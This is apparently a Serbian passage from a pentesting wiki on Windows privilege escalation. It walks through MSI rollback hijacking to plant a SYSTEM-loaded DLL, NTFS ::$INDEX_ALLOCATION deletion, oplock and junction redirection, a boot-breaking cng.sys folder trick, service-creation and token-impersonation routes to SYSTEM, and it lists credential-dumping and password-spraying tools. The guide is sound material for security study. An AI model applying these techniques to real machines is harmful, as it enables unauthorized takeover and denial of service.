Tehnika opisana u ovom [**blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Napad uglavnom podrazumeva zloupotrebu Windows Installer-ove rollback funkcije da zameni legitimne fajlove malicioznim tokom procesa deinstalacije. Za ovo napadač treba da napravi **malicious MSI installer** koji će biti korišćen za zauzimanje `C:\Config.Msi` foldera, koji će kasnije Windows Installer koristiti za čuvanje rollback fajlova tokom deinstalacije drugih MSI paketa, gde bi rollback fajlovi bili izmenjeni da sadrže maliciozni payload.

Sažeta tehnika je sledeća:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Kreirajte `.msi` koji instalira bezopasan fajl (npr. `dummy.txt`) u zapisivi folder (`TARGETDIR`).
- Obeležite installer kao **"UAC Compliant"**, tako da ga **ne-admin korisnik** može pokrenuti.
- Držite otvoren **handle** ka fajlu nakon instalacije.

- Step 2: Begin Uninstall
- Deinstalirajte isti `.msi`.
- Proces deinstalacije počinje premještanje fajlova u `C:\Config.Msi` i preimenovanje u `.rbf` fajlove (rollback bekapi).
- **Poll the open file handle** koristeći `GetFinalPathNameByHandle` da detektujete kada fajl postane `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` uključuje **custom uninstall action (`SyncOnRbfWritten`)** koja:
- Signalizira kada je `.rbf` napisan.
- Zatim **čekа** na drugi event pre nego što nastavi deinstalaciju.

- Step 4: Block Deletion of `.rbf`
- Kada je signal primljen, **otvorite `.rbf` fajl** bez `FILE_SHARE_DELETE` — ovo **sprečava njegovo brisanje**.
- Zatim **signalizirajte nazad** tako da deinstalacija može da se završi.
- Windows Installer ne uspeva da obriše `.rbf`, i pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Step 5: Manually Delete `.rbf`
- Vi (napadač) ručno obrišete `.rbf` fajl.
- Sada je **`C:\Config.Msi` prazan**, spreman za hijack.

> U ovom trenutku, **trigger the SYSTEM-level arbitrary folder delete vulnerability** da obrišete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Ponovo kreirajte `C:\Config.Msi` folder sami.
- Podesite **slabe DACL-ove** (npr. Everyone:F), i **držite otvoren handle** sa `WRITE_DAC`.

- Step 7: Run Another Install
- Instalirajte `.msi` ponovo, sa:
- `TARGETDIR`: zapisiva lokacija.
- `ERROROUT`: varijabla koja izaziva forcisani neuspeh.
- Ova instalacija će biti korišćena da ponovo pokrene **rollback**, koji čita `.rbs` i `.rbf`.

- Step 8: Monitor for `.rbs`
- Koristite `ReadDirectoryChangesW` da nadgledate `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
- Uhvatite njegovo ime fajla.

- Step 9: Sync Before Rollback
- `.msi` sadrži **custom install action (`SyncBeforeRollback`)** koja:
- Signalizira event kada je `.rbs` kreiran.
- Zatim **čekа** pre nego što nastavi.

- Step 10: Reapply Weak ACL
- Nakon primanja ` .rbs created` signala:
- Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
- Ali pošto i dalje imate handle sa `WRITE_DAC`, možete ponovo **primeniti slabe ACL-ove**.

> ACL-ovi se **primenjuju samo prilikom otvaranja handle-a**, tako da i dalje možete pisati u folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwriteujte `.rbs` fajl lažnim rollback skriptom koji kaže Windows-u da:
- Restore-uje vaš `.rbf` fajl (maliciozni DLL) u **privilegovan lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Postavite vaš lažni `.rbf` koji sadrži **maliciozni SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signalizirajte sync event da installer nastavi.
- A **type 19 custom action (`ErrorOut`)** je konfigurisan da **namerno prekine instalaciju** u poznatoj tački.
- Ovo izaziva početak **rollback-a**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Čita vaš maliciozni `.rbs`.
- Kopira vaš `.rbf` DLL u ciljanu lokaciju.
- Sada imate **maliciozni DLL na putanji koja se učitava od strane SYSTEM-a**.

- Final Step: Execute SYSTEM Code
- Pokrenite pouzdan **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL koji ste hijack-ovali.
- **Boom**: Vaš kod se izvršava **kao SYSTEM**.


### Od Arbitrary File Delete/Move/Rename do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete obrisati **celi folder** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost dozvoljava samo **arbitrary file deletion**?

Možete iskoristiti **NTFS internals**: svaki folder ima skriveni alternate data stream nazvan:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ovaj stream čuva **indeksne metapodatke** mape.

Dakle, ako **obrišete `::$INDEX_ALLOCATION` stream** mape, NTFS **uklanja celu mapu** iz datotečnog sistema.

Možete to uraditi koristeći standardne API-je za brisanje fajlova, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Iako pozivate *file* delete API, on zapravo **briše sam folder**.

### From Folder Contents Delete to SYSTEM EoP
Šta ako vaš primitiv ne dozvoljava brisanje proizvoljnih fajlova/foldera, ali on **dozvoljava brisanje *sadržaja* foldera pod kontrolom napadača**?

1. Korak 1: Napravite mamac direktorijum i fajl
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Korak 3: Pokrenite SYSTEM proces (npr. `SilentCleanup`)
- Ovaj proces skenira foldere (npr. `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada stigne do `file1.txt`, **oplock triggers** i prepušta kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
- Ovo prazni `folder1` bez prekidanja oplock-a.
- Nemojte direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Ovo cilja NTFS internal stream koji čuva metapodatke foldera — njegovo brisanje briše i folder.

5. Korak 5: Oslobađanje oplocka
- SYSTEM proces se nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja proizvoljnog foldera do trajnog DoS

Iskoristite primitiv koji vam omogućava da **kreirate proizvoljan folder kao SYSTEM/admin** — čak i ako **ne možete da pišete fajlove** ili **da postavite slabe dozvole**.

Kreirajte **folder** (ne fajl) sa imenom **kritičnog Windows drivera**, npr.:
```
C:\Windows\System32\cng.sys
```
- Ovaj put obično odgovara kernel-mode drajveru `cng.sys`.
- Ako ga **unapred kreirate kao mapu**, Windows ne uspe da učita stvarni drajver pri boot-u.
- Zatim, Windows pokuša da učita `cng.sys` tokom boot-a.
- Vidi mapu, **ne uspeva da otkrije stvarni drajver**, i **sruši se ili zaustavi pokretanje**.
- Ne postoji **fallback**, i **nema oporavka** bez spoljašnje intervencije (npr. popravka boot-a ili pristupa disku).


## **Iz High Integrity do System**

### **Novi servis**

Ako već radite u procesu sa High Integrity, **put do SYSTEM** može biti jednostavan samo **kreiranjem i izvršavanjem novog servisa**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Prilikom kreiranja service binarnog fajla postarajte se da je to validan service ili da binarni fajl izvrši neophodne akcije dovoljno brzo, jer će biti ubijen nakon 20s ako nije validan service.

### AlwaysInstallElevated

Iz High Integrity procesa možete pokušati da **omogućite AlwaysInstallElevated registry unose** i **instalirate** reverse shell koristeći _**.msi**_ wrapper.\
[Više informacija o uključenim registry ključevima i kako instalirati _.msi_ paket ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Možete** [**pronaći kod ovde**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate te token privilegije (verovatno ćete ih naći u već postojećem High Integrity procesu), bićete u mogućnosti da **otvorite gotovo bilo koji process** (ne protected processes) sa SeDebug privilegijom, **kopirate token** procesa i kreirate **arbitrary process sa tim tokenom**.\
Korišćenjem ove tehnike se obično **izabere neki process koji radi kao SYSTEM sa svim token privilegijama** (_da, možete naći SYSTEM procese bez svih token privilegija_).\
**Možete pronaći** [**primer koda koji izvodi predloženu tehniku ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Tehnika se sastoji u tome da se **kreira pipe i zatim kreira/zlorabi service da upiše u taj pipe**. Zatim, **server** koji je kreirao pipe koristeći **`SeImpersonate`** privilegiju moći će da **impersonira token** pipe klijenta (servisa) i tako dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes trebate pročitati ovo**](#named-pipe-client-impersonation).\
Ako želite primer [**kako ići iz high integrity do System koristeći name pipes pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspevate da **hijack-ujete dll** koji se **učitava** od strane **processa** koji radi kao **SYSTEM**, moći ćete da izvršite arbitrary kod sa tim privilegijama. Dakle, Dll Hijacking je takođe koristan za ovu vrstu eskalacije privilegija, i, štaviše, mnogo je **lakše postići iz high integrity procesa** jer će imati **write permissions** na foldere koji se koriste za učitavanje dll-ova.\
**Možete** [**saznati više o Dll hijacking ovde**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Pogledajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najbolji alat za traženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava za misconfigurations i osetljive fajlove (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće misconfigurations i prikuplja info (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava za misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP sačuvane session informacije. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači credentals iz Credential Manager-a. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray-uje prikupljene lozinke po domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer i man-in-the-middle alat.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna privesc Windows enumeracija**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Pretražuje poznate privesc ranjivosti (DEPRECATED za Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Zahteva Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Pretražuje poznate privesc ranjivosti (potrebno kompajlirati koristeći VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host tražeći misconfigurations (više alat za prikupljanje informacija nego privesc) (potrebno kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači credentials iz mnogih softvera (precompiled exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Proverava za misconfigurations (precompiled executable na github-u). Nije preporučeno. Ne radi dobro na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće misconfigurations (exe iz python-a). Nije preporučeno. Ne radi dobro na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen zasnovan na ovom postu (ne zahteva accesschk da bi radio pravilno ali ga može koristiti).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz **systeminfo** i preporučuje radne exploite (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz **systeminfo** i preporučuje radne exploite (lokalni python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Morate kompajlirati projekat koristeći ispravnu verziju .NET ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET na victim hostu možete uraditi:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Izvori

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
